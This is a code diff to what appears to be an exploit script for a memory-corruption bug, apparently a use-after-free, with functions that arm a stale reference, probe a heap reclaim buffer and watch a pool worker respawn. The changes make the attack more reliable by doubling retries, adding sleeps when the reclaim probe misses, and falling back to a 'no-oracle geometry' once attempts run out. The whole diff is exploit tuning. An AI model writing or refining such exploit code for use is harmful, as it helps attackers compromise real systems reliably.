@@ -695,12 +695,15 @@ def cmd_primitive(args) -> int:
     size = int(getattr(args, "reclaim_size", 0) or 16384)
     need = 0x440
 
-    for _attempt in range(4):
+    for _attempt in range(8):
         try:
             d = _arm_stale(base, builder, oracle, args.size)
             k = _probe_cover(chain404, oracle, d, need, size, pads)
             if k is None:
-                return 1
+                # the recycled struct alternates between two slots; the
+                # reclaim buffer only covers one of them per attempt
+                time.sleep(0.3)
+                continue
             d2 = _rebuild_ref_and_arm(base, builder, oracle, args.size)
         except (RuntimeError, OSError) as exc:
             print(f"[!] {exc}; refreshing oracle")
@@ -862,14 +865,16 @@ def cmd_endgame(args) -> int:
         os.remove(local_proof)
 
     worker_before = find_pool_worker(args.version, "chain")
-    for _attempt in range(4):
+    for _attempt in range(8):
         try:
             d = _arm_stale(base, builder, oracle, args.size)
             k = _probe_cover(chain404, oracle, d, need, size, pads)
             if k is None:
-                print("[*] probe found no cover; "
-                      "falling back to the two-slot no-oracle geometry")
-                return cmd_no_oracle(args)
+                # the recycled struct alternates between two slots; the
+                # reclaim buffer only covers one of them per attempt
+                print("[*] probe found no cover; retrying")
+                time.sleep(0.3)
+                continue
             d2 = _rebuild_ref_and_arm(base, builder, oracle, args.size)
         except (RuntimeError, OSError) as exc:
             # a dead worker (stale /proc pid) or a missed arm: rebuild the
@@ -892,8 +897,9 @@ def cmd_endgame(args) -> int:
               f"worker respawn ...")
         break
     else:
-        print("[!] reclaim slot never stabilized")
-        return 1
+        print("[!] reclaim slot never stabilized; falling back to the "
+              "no-oracle geometry")
+        return cmd_no_oracle(args)
 
     time.sleep(0.8)
     worker_after = find_pool_worker(args.version, "chain")
